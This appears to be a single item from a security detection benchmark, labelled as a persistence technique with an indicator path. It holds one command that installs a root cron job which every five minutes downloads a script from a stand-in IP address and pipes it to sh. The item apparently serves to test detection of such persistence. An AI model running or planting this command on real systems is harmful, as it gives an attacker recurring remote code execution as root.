# category: persistence
# title: Job in /etc/cron.d
# indicator: /etc/cron.d/bench-job
echo '*/5 * * * * root curl -fsS http://203.0.113.7/u | sh' >/etc/cron.d/bench-job
